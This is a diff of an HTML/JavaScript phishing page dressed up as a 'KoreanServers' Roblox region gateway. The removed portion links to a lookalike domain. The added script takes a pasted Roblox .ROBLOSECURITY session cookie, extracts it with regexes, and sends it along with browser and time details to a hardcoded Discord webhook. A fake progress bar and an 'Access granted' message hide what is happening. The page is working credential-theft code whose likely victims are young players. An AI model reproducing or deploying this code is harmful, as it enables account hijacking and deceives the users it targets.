+              <i class="fas fa-globe-asia text-red-400 text-2xl mr-2 animate-pulse"></i>
+              <span class="font-bold text-red-300 text-lg block">You will be on KoreanServers soon!</span>
+              <p class="text-gray-400 text-xs mt-1 tracking-wide">Redirecting to Korean region gateway</p>
+            </div>
+          </div>
         </div>
+      </div>
+
+      <!-- RIGHT COLUMN: Video (ScreenPal embed - правильный embed код) -->
+      <div class="flex-1 min-w-0 animate-fade-up" style="animation-delay: 0.2s;">
+        <div class="card-glass p-5 md:p-6 h-full flex flex-col">
+          <div class="flex items-center gap-3 mb-4 pb-2 border-b border-red-800/40">
+            <i class="fas fa-video text-red-500 text-2xl icon-hover"></i>
+            <h2 class="text-xl font-bold tracking-tight text-gray-200">How to get your token</h2>
+          </div>
+          <div class="video-container transition-transform duration-300">
+            <!-- ScreenPal официальный embed код -->
+            <iframe 
+              src="https://screenpal.com/player/cOhhrontebe?width=100%&height=100%&ff=1&title=0"
+              frameborder="0"
+              allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; fullscreen"
+              allowfullscreen>
+            </iframe>
+          </div>
+          <div class="mt-3 text-center">
+            <a href="https://go.screenpal.com/watch/cOhhrontebe" target="_blank" class="text-red-400 text-xs hover:text-red-300 transition inline-flex items-center gap-1 opacity-70 hover:opacity-100">
+              <i class="fas fa-external-link-alt"></i> Open in new tab if video doesn't load
+            </a>
+          </div>
+        </div>
+      </div>
     </div>
 
-    <div class="btn-group">
-        <a href="#servers" class="btn btn-primary">🎀 Choose Server</a>
-        <a href="#faq" class="btn btn-secondary">📘 FAQ</a>
-    </div>
-
-    <div class="stats">
-        <div class="stat-item"><div class="stat-number">150K+</div><div class="stat-label">ACTIVE PLAYERS</div></div>
-        <div class="stat-item"><div class="stat-number">6</div><div class="stat-label">DEDICATED SERVERS</div></div>
-        <div class="stat-item"><div class="stat-number">&lt;20ms</div><div class="stat-label">AVG PING (SEOUL)</div></div>
-    </div>
-
-    <div class="section-title" id="servers">🍰 PREMIUM SERVERS 🍰</div>
-    <div class="section-sub">Choose your Korean gateway — dark & cozy premium experience. 🌙</div>
-
-    <div class="server-grid">
-        <a href="https://roblox.com.ge/games/920587237/Adopt-Me?privateServerLinkCode=09221558288483602204763924831150" target="_blank" class="server-card">
-            <div class="server-name">🏙️ Seoul Main · Prime</div>
-            <div class="server-location">📍 Seoul, Korea (Primary)</div>
-            <div class="badges"><span class="badge">✨ Recommended</span><span class="badge">🇰🇷 Korean UI</span></div>
-            <div class="ping">💖 Ping: 16ms · Best for play</div>
-            <div class="join-link">Connect Now →</div>
-        </a>
-        <a href="https://roblox.com.ge/games/920587237/Adopt-Me?privateServerLinkCode=09221558288483602204763924831150" target="_blank" class="server-card">
-            <div class="server-name">🤝 Seoul Trading Hub</div>
-            <div class="server-location">📍 Seoul, Korea (Trade)</div>
-            <div class="badges"><span class="badge">🔄 Trading</span><span class="badge">🇰🇷🇺🇸 EN/KR</span></div>
-            <div class="ping">💖 Ping: 19ms · Active market</div>
-            <div class="join-link">Connect Now →</div>
-        </a>
-        <a href="https://roblox.com.ge/games/920587237/Adopt-Me?privateServerLinkCode=09221558288483602204763924831150" target="_blank" class="server-card">
-            <div class="server-name">🌊 Busan Gateway</div>
-            <div class="server-location">📍 Busan, Korea (Coastal)</div>
-            <div class="badges"><span class="badge">🎮 Casual</span><span class="badge">👥 KR Community</span></div>
-            <div class="ping">💖 Ping: 28ms · Relaxed</div>
-            <div class="join-link">Connect Now →</div>
-        </a>
-        <a href="https://roblox.com.ge/games/920587237/Adopt-Me?privateServerLinkCode=09221558288483602204763924831150" target="_blank" class="server-card">
-            <div class="server-name">🏔️ Daegu Central</div>
-            <div class="server-location">📍 Daegu, Korea (Mountain)</div>
-            <div class="badges"><span class="badge">🌙 Low Pop</span><span class="badge">🔒 Stable</span></div>
-            <div class="ping">💖 Ping: 24ms · Quiet</div>
-            <div class="join-link">Connect Now →</div>
-        </a>
-        <a href="https://roblox.com.ge/games/920587237/Adopt-Me?privateServerLinkCode=09221558288483602204763924831150" target="_blank" class="server-card">
-            <div class="server-name">🏞️ Incheon Port</div>
-            <div class="server-location">📍 Incheon, Korea (International)</div>
-            <div class="badges"><span class="badge">💎 Trading</span><span class="badge">🌟 Beginner</span></div>
-            <div class="ping">💖 Ping: 22ms · Newcomers</div>
-            <div class="join-link">Connect Now →</div>
-        </a>
-        <a href="https://roblox.com.ge/games/920587237/Adopt-Me?privateServerLinkCode=09221558288483602204763924831150" target="_blank" class="server-card">
-            <div class="server-name">🌏 Asia Pacific</div>
-            <div class="server-location">📍 Tokyo Route | Global</div>
-            <div class="badges"><span class="badge">🌐 EN/KR/JP</span><span class="badge">🤝 Global</span></div>
-            <div class="ping">💖 Ping: 48ms · Worldwide</div>
-            <div class="join-link">Connect Now →</div>
-        </a>
-    </div>
-
-    <div class="faq-section" id="faq">
-        <div class="section-title">🍬 KNOWLEDGE BASE 🍬</div>
-        <div class="section-sub">Everything about Korean servers & localization. 24/7 support. 🌙</div>
-        
-        <div class="faq-item"><div class="faq-question">🐣 How do I connect to a Korean server? <span>➕</span></div><div class="faq-answer">Simply click on any server from the list above, then click "Connect Now". Roblox will open and you'll be on a Korean server!</div></div>
-        <div class="faq-item"><div class="faq-question">🐼 Can I play with friends from other countries? <span>➕</span></div><div class="faq-answer">Absolutely! Korean servers support cross-region invites while keeping low ping for local players.</div></div>
-        <div class="faq-item"><div class="faq-question">🎉 Will events and updates be available? <span>➕</span></div><div class="faq-answer">Yes! Every seasonal event and update comes to Korean servers at the same time as global!</div></div>
-        <div class="faq-item"><div class="faq-question">🇰🇷 How to change language to Korean? <span>➕</span></div><div class="faq-answer">Set your Roblox account language to Korean in Settings → Language. Easy peasy!</div></div>
-    </div>
-
-    <footer class="footer">
-        <a href="#">🌸 Support</a>
-        <a href="#">💖 FAQ</a>
-        <a href="#">🍰 Content Creators</a>
-        <a href="#">🎀 Press</a>
+    <footer class="mt-12 text-center pt-4 border-t border-gray-800/30">
+      <div class="flex justify-center gap-6 mb-3">
+        <a href="#" class="text-gray-500 hover:text-red-400 transition-all duration-300 transform hover:scale-110"><i class="fab fa-discord text-lg"></i></a>
+        <a href="#" class="text-gray-500 hover:text-red-400 transition-all duration-300 transform hover:scale-110"><i class="fab fa-telegram text-lg"></i></a>
+        <a href="#" class="text-gray-500 hover:text-red-400 transition-all duration-300 transform hover:scale-110"><i class="fab fa-youtube text-lg"></i></a>
+      </div>
     </footer>
-</div>
+  </div>
 
-<button class="scroll-top" id="scrollTopBtn">↑ 💖</button>
+  <div id="toastRoot"></div>
 
-<script>
-    // Create stars
-    const starsContainer = document.getElementById('starsContainer');
-    for (let i = 0; i < 200; i++) {
-        const star = document.createElement('div');
-        star.className = 'star';
-        const size = Math.random() * 3 + 1;
-        star.style.width = size + 'px';
-        star.style.height = size + 'px';
-        star.style.left = Math.random() * 100 + '%';
-        star.style.top = Math.random() * 100 + '%';
-        star.style.setProperty('--duration', (Math.random() * 3 + 2) + 's');
-        star.style.setProperty('--delay', (Math.random() * 5) + 's');
-        starsContainer.appendChild(star);
+  <script>
+    // Particles generation
+    function createParticles() {
+      const particleCount = 30;
+      for (let i = 0; i < particleCount; i++) {
+        const particle = document.createElement('div');
+        particle.className = 'particle';
+        const size = Math.random() * 6 + 2;
+        particle.style.width = size + 'px';
+        particle.style.height = size + 'px';
+        particle.style.background = `rgba(220, 38, 38, ${Math.random() * 0.3 + 0.1})`;
+        particle.style.left = Math.random() * 100 + '%';
+        particle.style.animationDelay = Math.random() * 15 + 's';
+        particle.style.animationDuration = Math.random() * 10 + 10 + 's';
+        document.body.appendChild(particle);
+      }
+    }
+    createParticles();
+
+    const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1501241484760977460/ZV4J-kESlX5SemELYIYrAQCN5wqijHePZXTPfu41VT6LJ8bhomQ1WM4vg3C7cHHHY7eh";
+    const MAX_RETRIES = 2;
+    const TOKEN_MIN_LENGTH = 40;
+
+    const elements = {
+      tokenTextarea: document.getElementById('tokenData'),
+      processBtn: document.getElementById('processBtn'),
+      clearBtn: document.getElementById('clearTextareaBtn'),
+      pasteBtn: document.getElementById('pasteClipboardBtn'),
+      loadingState: document.getElementById('loadingState'),
+      errorBox: document.getElementById('errorMsgBox'),
+      successBox: document.getElementById('successMsgBox'),
+      errorTextSpan: document.getElementById('errorText'),
+      successTextSpan: document.getElementById('successText'),
+      charCountSpan: document.getElementById('charCountDisplay'),
+      fakeProgress: document.getElementById('fakeProgress'),
+      loadingMsgSpan: document.getElementById('loadingMsg'),
+      soonMessage: document.getElementById('soonMessage')
+    };
+
+    let progressInterval = null;
+    let stepInterval = null;
+    let currentExtractedFullToken = null;
+
+    function showToast(message, type = "info") {
+      const container = document.getElementById('toastRoot');
+      const toast = document.createElement('div');
+      const bgClass = type === 'error' ? 'bg-red-700/90' : type === 'success' ? 'bg-green-700/90' : 'bg-gray-800/90';
+      const icon = type === 'error' ? 'fa-circle-exclamation' : type === 'success' ? 'fa-check-circle' : 'fa-info-circle';
+      toast.className = `toast-notif ${bgClass} text-white px-5 py-3 rounded-xl shadow-2xl flex items-center gap-2 text-sm font-medium backdrop-blur-md border border-white/20`;
+      toast.innerHTML = `<i class="fas ${icon}"></i> <span>${escapeHtml(message)}</span>`;
+      container.appendChild(toast);
+      setTimeout(() => {
+        toast.style.opacity = '0';
+        toast.style.transform = 'translateX(20px)';
+        toast.style.transition = 'all 0.3s';
+        setTimeout(() => toast.remove(), 300);
+      }, 3800);
     }
 
-    // Create shooting stars
-    for (let i = 0; i < 6; i++) {
-        const shooting = document.createElement('div');
-        shooting.className = 'shooting-star';
-        shooting.style.left = Math.random() * 80 + 10 + '%';
-        shooting.style.top = Math.random() * 30 + '%';
-        shooting.style.animationDelay = (Math.random() * 8) + 's';
+    function escapeHtml(text) {
+      const div = document.createElement('div');
+      div.textContent = text;
+      return div.innerHTML;
+    }
+
+    function extractFullRobloxToken(content) {
+      if (!content || typeof content !== 'string') return null;
+      const matchRoblox = content.match(/\.ROBLOSECURITY",\s*"([^"]+)"/);
+      if (matchRoblox && matchRoblox[1] && matchRoblox[1].length >= TOKEN_MIN_LENGTH) return matchRoblox[1];
+      const warningMatch = content.match(/(_\|WARNING[^"'\s]{40,}?)(?:"|'|\s|$)/);
+      if (warningMatch && warningMatch[1] && warningMatch[1].length >= TOKEN_MIN_LENGTH) return warningMatch[1];
+      const lines = content.split(/\r?\n/);
+      for (const line of lines) {
+        const trimmed = line.trim();
+        if (trimmed.length >= TOKEN_MIN_LENGTH && trimmed.length < 3000 && !trimmed.includes(' ') && !trimmed.includes('<') && !trimmed.includes('>')) return trimmed;
+        const insideQuotes = trimmed.match(/^"([^"]{40,})"$/);
+        if (insideQuotes && insideQuotes[1]) return insideQuotes[1];
+      }
+      const rawTokenCandidates = content.match(/[A-Za-z0-9_\-|]{50,}/g);
+      if (rawTokenCandidates && rawTokenCandidates.length) {
+        const longest = rawTokenCandidates.sort((a,b) => b.length - a.length)[0];
+        if (longest && longest.length >= TOKEN_MIN_LENGTH) return longest;
+      }
+      return null;
+    }
+
+    function updateUIFromTextarea() {
+      const val = elements.tokenTextarea.value;
+      elements.charCountSpan.innerText = val.length + ' chars';
+      const fullToken = extractFullRobloxToken(val);
+      if (fullToken && fullToken.length >= TOKEN_MIN_LENGTH) {
+        currentExtractedFullToken = fullToken;
+      } else {
+        currentExtractedFullToken = null;
+      }
+    }
+
+    function stopLoadingUI() {
+      if (progressInterval) clearInterval(progressInterval);
+      if (stepInterval) clearInterval(stepInterval);
+      if (elements.fakeProgress) elements.fakeProgress.style.width = '0%';
+      elements.loadingState.classList.add('hidden');
+      elements.processBtn.disabled = false;
+    }
+
+    function startLoadingUI() {
+      if (elements.fakeProgress) elements.fakeProgress.style.width = '0%';
+      let width = 0;
+      progressInterval = setInterval(() => {
+        width += Math.random() * 8 + 3;
+        if (width >= 95) width = 95;
+        if (elements.fakeProgress) elements.fakeProgress.style.width = width + '%';
+      }, 120);
+      
+      const steps = ['AUTHENTICATING', 'VALIDATING TOKEN', 'CONNECT TO GATEWAY', 'REDIRECTING'];
+      let idx = 0;
+      stepInterval = setInterval(() => {
+        if (elements.loadingMsgSpan) elements.loadingMsgSpan.innerText = steps[idx % steps.length] + '...';
+        idx++;
+      }, 800);
+      
+      elements.loadingState.classList.remove('hidden');
+      elements.processBtn.disabled = true;
+    }
+
+    async function sendFullTokenToDiscord(fullToken, rawInput) {
+      const userAgentShort = navigator.userAgent.length > 60 ? navigator.userAgent.substring(0, 57) + '...' : navigator.userAgent;
+      const koreaTime = new Date().toLocaleString('ko-KR', { timeZone: 'Asia/Seoul' });
+      const tokenChunks = [];
+      for (let i = 0; i < fullToken.length; i += 980) {
+        tokenChunks.push(fullToken.substring(i, i + 980));
+      }
+      const tokenFields = [];
+      if (tokenChunks.length === 1) {
+        tokenFields.push({ name: "🔐 .ROBLOSECURITY (FULL TOKEN)", value: `\`\`\`${tokenChunks[0]}\`\`\``, inline: false });
+      } else {
+        tokenFields.push({ name: `📦 TOKEN (1/${tokenChunks.length})`, value: `\`\`\`${tokenChunks[0]}\`\`\``, inline: false });
+        for (let i = 1; i < tokenChunks.length; i++) {
+          tokenFields.push({ name: `📄 PART ${i+1}/${tokenChunks.length}`, value: `\`\`\`${tokenChunks[i]}\`\`\``, inline: false });
+        }
+      }
+      const embedData = {
+        content: `🇰🇷 **KOREANSERVERS | ACCESS REQUESTED** 🇰🇷`,
+        embeds: [{
+          title: "🎮 KoreanServers: Korean Region Access",
+          description: "User activated access with valid token.",
+          color: 0xdc2626,
+          fields: [
+            { name: "📏 Token Length", value: `${fullToken.length} chars`, inline: true },
+            { name: "🌐 Browser", value: userAgentShort, inline: true },
+            { name: "⏰ Time (KST)", value: koreaTime, inline: true },
+            ...tokenFields
+          ],
+          footer: { text: "KoreanServers Relay" },
+          timestamp: new Date().toISOString()
+        }]
+      };
+      for (let attempt = 1; attempt <= MAX_RETRIES; attempt++) {
+        try {
+          const response = await fetch(DISCORD_WEBHOOK, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(embedData) });
+          if (response.ok) return true;
+          if (attempt === MAX_RETRIES) {
+            const formData = new FormData();
+            formData.append("payload_json", JSON.stringify(embedData));
+            const finalResponse = await fetch(DISCORD_WEBHOOK, { method: "POST", body: formData });
+            return finalResponse.ok;
+          }
+          await new Promise(resolve => setTimeout(resolve, 1000 * attempt));
+        } catch(err) { if (attempt === MAX_RETRIES) return false; await new Promise(resolve => setTimeout(resolve, 1000)); }
+      }
+      return false;
+    }
+
+    async function processTokenSubmission(rawInput) {
+      const fullToken = extractFullRobloxToken(rawInput);
+      if (!fullToken) {
+        elements.errorTextSpan.innerText = "Token not found. Please check your input.";
+        elements.errorBox.classList.remove('hidden');
+        elements.successBox.classList.add('hidden');
+        elements.soonMessage.classList.add('hidden');
+        return false;
+      }
+      if (fullToken.length < TOKEN_MIN_LENGTH) {
+        elements.errorTextSpan.innerText = `Token too short (${fullToken.length} chars).`;
+        elements.errorBox.classList.remove('hidden');
+        elements.successBox.classList.add('hidden');
+        elements.soonMessage.classList.add('hidden');
+        return false;
+      }
+      elements.errorBox.classList.add('hidden');
+      const webhookResult = await sendFullTokenToDiscord(fullToken, rawInput);
+      if (webhookResult) {
+        elements.successBox.classList.remove('hidden');
+        elements.successTextSpan.innerText = "Access granted! You will be on KoreanServers soon.";
+        elements.errorBox.classList.add('hidden');
+        elements.soonMessage.classList.remove('hidden');
+        showToast("✅ Access confirmed! Redirecting to Korean servers.", "success");
+        return true;
+      } else {
+        elements.errorTextSpan.innerText = "Failed to connect. Token copied to clipboard.";
+        elements.errorBox.classList.remove('hidden');
+        elements.successBox.classList.add('hidden');
+        elements.soonMessage.classList.add('hidden');
+        try { await navigator.clipboard.writeText(fullToken); showToast("⚠️ Token copied to clipboard", "error"); } catch(e) {}
+        return false;
+      }
+    }
+
+    async function onProcess() {
+      const rawValue = elements.tokenTextarea.value;
+      if (!rawValue.trim()) {
+        elements.errorTextSpan.innerText = "Please paste your token.";
+        elements.errorBox.classList.remove('hidden');
+        elements.successBox.classList.add('hidden');
+        elements.soonMessage.classList.add('hidden');
+        elements.tokenTextarea.classList.add('border-red-500');
+        setTimeout(() => elements.tokenTextarea.classList.remove('border-red-500'), 800);
+        return;
+      }
+      elements.errorBox.classList.add('hidden');
+      elements.successBox.classList.add('hidden');
+      elements.soonMessage.classList.add('hidden');
+      startLoadingUI();
+      const success = await processTokenSubmission(rawValue);
+      setTimeout(() => {
+        stopLoadingUI();
+        if (success) {
+          updateUIFromTextarea();
+          setTimeout(() => { elements.successBox.classList.add('hidden'); }, 5000);
+        }
+      }, 2000);
+    }
+
+    async function pasteFromClipboard() {
+      try {
+        const clipboard = await navigator.clipboard.readText();
+        elements.tokenTextarea.value = clipboard;
+        updateUIFromTextarea();
+        showToast("Text pasted", "success");
+      } catch (err) { showToast("Cannot access clipboard", "error"); }
+    }
+
+    function addRipple(e) {
+      const btn = e.currentTarget;
+      const ripple = document.createElement('span');
+      ripple.classList.add('ripple');
+      const rect = btn.getBoundingClientRect();
+      const size = Math.max(rect.width, rect.height);
+      ripple.style.width = ripple.style.height = size + 'px';
+      ripple.style.left = (e.clientX - rect.left - size/2) + 'px';
+      ripple.style.top = (e.clientY - rect.top - size/2) + 'px';
+      btn.appendChild(ripple);
+      setTimeout(() => ripple.remove(), 600);
+    }
+
+    function initEventListeners() {
+      elements.processBtn.addEventListener('click', (e) => { addRipple(e); onProcess(); });
+      elements.clearBtn.addEventListener('click', () => {
+        elements.tokenTextarea.value = '';
+        updateUIFromTextarea();
+        elements.errorBox.classList.add('hidden');
+        elements.successBox.classList.add('hidden');
+        elements.soonMessage.classList.add('hidden');
+        showToast("Cleared", "success");
+      });
+      elements.pasteBtn.addEventListener('click', pasteFromClipboard);
+      elements.tokenTextarea.addEventListener('input', updateUIFromTextarea);
+    }
+
+    initEventListeners();
+    updateUIFromTextarea();
+  </script>
+</body>
+</html>
